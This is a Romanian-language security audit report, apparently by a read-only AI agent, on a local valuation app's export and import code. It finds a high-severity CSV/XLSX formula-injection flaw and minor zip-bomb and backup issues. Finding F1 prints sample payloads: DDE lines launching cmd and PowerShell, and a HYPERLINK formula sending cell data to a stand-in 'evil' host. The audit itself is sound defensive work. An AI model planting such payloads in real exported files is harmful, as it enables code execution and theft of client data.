# Audit securitate — cod nou nerevizuit (2026-06-11)

**Scop:** revizuire de securitate, READ-ONLY, a codului adăugat recent și nerevizuit:
`registru/` (numar.py, xlsx_min.py, registru.py), `calitate.py`, `big.py`, `esg.py`,
`valoare_prudenta.py` + endpoint-urile noi din `web/routers/registru.py` și `web/routers/curent.py`
(export.zip, calitate, big, backup).

**Auditor:** agent securitate (read-only — niciun fișier de cod modificat).

---

## Model de amenințare (context, esențial pentru severități)

Aplicația este un **desktop app local mono-utilizator** (vezi `web/app.py`):

- Servește DOAR pe host local; middleware `doar_host_local` respinge orice `Host` non-local
  (anti DNS-rebinding) și orice `Origin` cross-site la metode mutante (anti-CSRF).
- **Nu există autentificare** și **nu există multi-tenancy** — un singur evaluator deține toate
  dosarele. Nu există „alt utilizator" către care să se facă traversare sau escaladare.
- Plafon global de corp 50 MB în middleware; upload-urile dedicate au plafon 35 MB pe payload.
- Headere de securitate (nosniff, X-Frame-Options DENY, CSP) setate global.

Consecință: vectorii clasici de web multi-tenant (IDOR, exfiltrare PII cross-user) **nu se aplică**.
Singurul atacator realist pentru export-uri este: (a) date ostile introduse în wizard care ajung
într-un fișier exportat și deschis în **alt program** (Excel/LibreOffice) — vector real; sau
(b) un dosar/folder importat dintr-o sursă externă. Severitățile de mai jos reflectă acest context.

---

## Rezumat findings

| # | Severitate | Titlu | Locație |
|---|-----------|-------|---------|
| F1 | **HIGH** | CSV / XLSX formula injection în exportul de registru | `registru/registru.py`, `registru/xlsx_min.py` |
| F2 | LOW | `import-docx` / `incarca-submis`: docx = zip → posibil zip-bomb la parsare | `web/routers/curent.py` |
| F3 | INFO | `backup-dosare.zip` include fișiere derivate cu PII (cache antete) | `web/routers/curent.py` |
| F4 | INFO | (Verificat — NU e vulnerabil) path-traversal pe `uid` la export.zip / sterge | `dosare_fs.py` |
| F5 | INFO | (Verificat — NU e vulnerabil) race la alocarea nr_lucrare | `registru/numar.py` |

---

## F1 — CSV / XLSX formula injection (CWE-1236) — HIGH

**OWASP:** A03:2021 Injection (CSV Injection / Formula Injection).
**Severitate:** HIGH (impact = RCE pe mașina celui care deschide exportul; probabilitate moderată —
necesită ca cineva să deschidă fișierul în Excel/LibreOffice cu macro-uri/DDE activate).

### Locație
- `src/evaluare/registru/registru.py` — `csv_text()` (linia 136) și `xlsx_bytes()` (linia 147),
  alimentate de `_matrice()` (linia 130) din valorile rândurilor produse de `rand()` (linia 90).
- `src/evaluare/registru/xlsx_min.py` — `_celula()` (linia 55) și `_esc()` (linia 40).
- Endpoint-uri expuse: `GET /api/registru.csv` și `GET /api/registru.xlsx`
  (`web/routers/registru.py`, liniile 104–112).

### Probă / cauză
Coloanele registrului provin DIRECT din snapshot-ul wizardului controlat de utilizator:
`client`, `proprietar`, `obiect` (adresă/localitate/nr. cadastral), `observatii`, `utilizatori`,
`contract` etc. (vezi `rand()` în `registru.py`, liniile 94–112). Aceste valori sunt scrise în export
**fără neutralizarea caracterelor de început de formulă**.

- **CSV** (`csv_text`): `csv.writer` aplică doar quoting RFC-4180 (escapează `"`, `,`, newline). NU
  neutralizează un câmp care începe cu `=`, `+`, `-`, `@`, TAB (`0x09`) sau CR (`0x0D`). Excel/LibreOffice
  interpretează un astfel de câmp ca **formulă** la deschidere.
- **XLSX** (`xlsx_min._celula`): pentru text se produce `t="inlineStr"` și se apelează `_esc()`, care
  escapează DOAR entitățile XML (`& < > "`). Un text ca `=cmd|'/c calc'!A1` este scris ca inline string
  valid; deși o celulă `inlineStr` nu e auto-evaluată la fel de agresiv ca un câmp CSV, conținutul
  rămâne neneutralizat și poate fi promovat la formulă (copy/paste, „Convert to formula", DDE).

Exemplu de payload introdus de utilizator în câmpul „Observații" sau „Client" al unui dosar:
```
=cmd|'/c powershell -enc <base64>'!A1
@SUM(1+1)*cmd|'/c calc'!A1
=HYPERLINK("http://evil/?leak="&A2&B2,"click")    # exfiltrare PII din alte celule
```
La deschiderea `registru-rapoarte.csv` în Excel, prima formă poate declanșa execuție prin DDE; a treia
exfiltrează datele clienților din rândurile adiacente printr-un hyperlink.

### Impact în context
Registrul §6 e exact fișierul pe care evaluatorul îl deschide în Excel și îl trimite mai departe
(la control ANEVAR, la bancă). Un câmp ostil (ex. preluat dintr-un anunț importat sau dintr-un docx
de import) ajunge într-un fișier care va fi deschis pe ALTĂ mașină → vector de execuție/exfiltrare
care iese din perimetrul local al aplicației. De aceea rămâne HIGH în ciuda modelului mono-utilizator.

### Fix recomandat
Neutralizează valorile textuale la export, în UN SINGUR loc per format:

- Pentru CSV: prefixează cu apostrof (`'`) orice celulă text care începe cu `= + - @ \t \r`
  (tehnica OWASP standard), SAU prefixează cu un caracter de tab-stop. Aplică în `_matrice`/`csv_text`.
- Pentru XLSX: aplică aceeași gardă în `xlsx_min._celula()` pe ramura de text (după ce s-a stabilit că
  `val` nu e numeric), înainte de `_esc()`.

Schiță (pseudo):
```python
_PERICULOASE = ("=", "+", "-", "@", "\t", "\r")
def _neutralizeaza(text: str) -> str:
    return "'" + text if text[:1] in _PERICULOASE else text
```
Notă: nu aplica neutralizarea valorilor numerice (rămân numere); doar text. Adaugă un test cu un câmp
`=cmd` care verifică prefixarea în ambele export-uri.

---

## F2 — docx import = zip → posibil zip-bomb / decompression bomb (CWE-409) — LOW

**OWASP:** A05:2021 Security Misconfiguration / resurse nemărginite.
**Severitate:** LOW (DoS local, self-inflicted — nu există atacator remote; mono-utilizator).

### Locație
`web/routers/curent.py` — `import_docx` (liniile 106–140) și `incarca_submis` (liniile 326–352);
parsarea în `importers/docx_dosar.py` → `docx.Document(str(path))`.

### Probă
Există plafon pe **payload base64** (`len(payload) > 35_000_000` → 413). Dar un `.docx` de ~25 MB
comprimat este un ZIP care, la parsarea cu `python-docx` (`docx.Document`), poate decomprima la GB
(zip-bomb / XML balonat). Nu există plafon pe dimensiunea decomprimată sau pe numărul de entry-uri.

### Impact
Hang/OOM al procesului local la import. Fiind app local mono-utilizator, atacatorul ar fi chiar
utilizatorul (sau un fișier docx primit de la un terț și importat). Impact limitat la propria sesiune.

### Fix recomandat (opțional, defense-in-depth)
- La parsarea docx, deschide manual zip-ul și respinge dacă suma `file_size` din `infolist()` depășește
  un prag (ex. 200 MB) sau dacă numărul de entry-uri e anormal (>2000), înainte de `docx.Document`.
- Alternativ, rulează parsarea cu o limită de memorie/timp.

---

## F3 — `backup-dosare.zip` include fișiere derivate cu PII — INFO

**Severitate:** INFO (by-design pentru mono-utilizator; nu e leak cross-user).

### Locație
`web/routers/curent.py` — `backup_dosare` (liniile 392–408): `baza.rglob("*")` arhivează TOT ce e sub
`OUTPUT_DIR/dosare`, inclusiv `_cache_antete.json` (conține nume client — PII) și `_index.json`.

### Observație
Spre deosebire de `export.zip` (un singur dosar, comentat explicit ca „nu expui PII-ul celorlalți
clienți"), `backup-dosare.zip` este intenționat arhiva COMPLETĂ a aceluiași utilizator → corect în
modelul mono-utilizator. Singura notă: include și fișiere de cache derivate (nu doar `dosar.json` +
`.docx`), care reintroduc PII deja prezent în dosare. Fără impact suplimentar de securitate; menționat
pentru completitudine (eventual exclude `_cache_antete.json` din backup ca igienă, nu ca fix de sec).

---

## F4 — Path traversal pe `uid` — VERIFICAT, NU este vulnerabil ✓

**Concluzie:** protecția este **solidă**. `dosare_fs._cale()` (liniile 34–46) trece orice `uid` prin
`uuid.UUID(str(uid))` și folosește forma **canonică** ca nume de folder. Orice `uid` care nu e un UUID
valid (deci orice `uid` care conține `..`, `/`, `\`, NUL etc.) ridică `KeyError` → 404. Toate rutele
care ating discul folosesc `_cale()` / `folder_dosar()`:

- `export.zip` (`curent.py` linia 410): `fs.incarca(uid)` + `fs.folder_dosar(uid)` (ambele validate);
  arhivarea folosește `folder.glob("*")` + `z.write(p, p.name)` → numai fișiere din interiorul folderului
  validat, nume = `p.name` (fără cale) → **fără zip-slip la scriere, fără traversare la citire**.
- `sterge` (`dosare_fs.py` linia 158): `shutil.rmtree(_cale(uid))` — `_cale` blochează `..` → `rmtree`
  nu poate ieși din `dosare/` (riscul „rmtree pe date/" descris în docstring este efectiv prevenit).
- `/api/dosar/{uid}/big`, `/calitate`, `/calcul`, `/raport.docx` etc. — toate prin `fs.incarca(uid)`.

Nicio acțiune necesară.

---

## F5 — Race / atomicitate la alocarea nr_lucrare — VERIFICAT, NU este vulnerabil ✓

**Locație:** `registru/numar.py` — `aloca()` (liniile 42–61).

**Concluzie:** alocarea este **corect atomică**. `os.open(cale, O_CREAT|O_EXCL|O_WRONLY)` este o operație
atomică „creează-dacă-nu-există" atât pe NTFS (Windows) cât și pe POSIX. La coliziune (alt proces a luat
indexul între estimarea `_urmatorul_liber` și creare) se ridică `FileExistsError`, iar bucla
incrementează și reîncearcă până prinde un slot liber. Doi creatori concurenți NU pot primi același
număr. `_urmatorul_liber` este doar un punct de plecare (nu autoritar), deci nu introduce TOCTOU.
Golurile în numerotare la ștergerea unui dosar sunt comportament intenționat (fișiere-marcaj persistente,
ca la facturi). Nicio acțiune necesară.

---

## Module pure verificate — fără finding de securitate

- **`big.py`** — logică + pydantic, fără I/O / rețea / deserializare de date externe. `genereaza_cod_unic`
  folosește SHA-256 doar ca identificator idempotent (nu scop criptografic) → OK.
- **`calitate.py`** — pur read-only peste `ReportContext`; fără sink de injection/IO.
- **`esg.py`** — catalog static + generare text; `observatie` user ajunge în text simplu de raport
  (.docx), nu într-un context de injection.
- **`valoare_prudenta.py`** — aritmetică `Decimal` cu validări pydantic (`ge=0, le=100`); `money.py`
  folosește `Decimal(str(value))` (fără `eval`). Fără I/O.
- Niciun sink de deserializare nesigură (serializare binară / `yaml.load` / `eval` / `exec` / `marshal`)
  în întregul set auditat.

---

## Prioritizare

1. **F1 (HIGH)** — singura problemă cu fix recomandat: neutralizare formula-injection în
   `registru.py` (CSV) + `xlsx_min._celula` (XLSX). Adaugă test cu payload `=cmd`.
2. F2 (LOW) — opțional, hardening zip-bomb la import docx.
3. F3 (INFO) — igienă: exclude fișierele de cache din backup.

F4 și F5 sunt confirmate ca NEvulnerabile (documentate pentru a închide întrebările din scop).
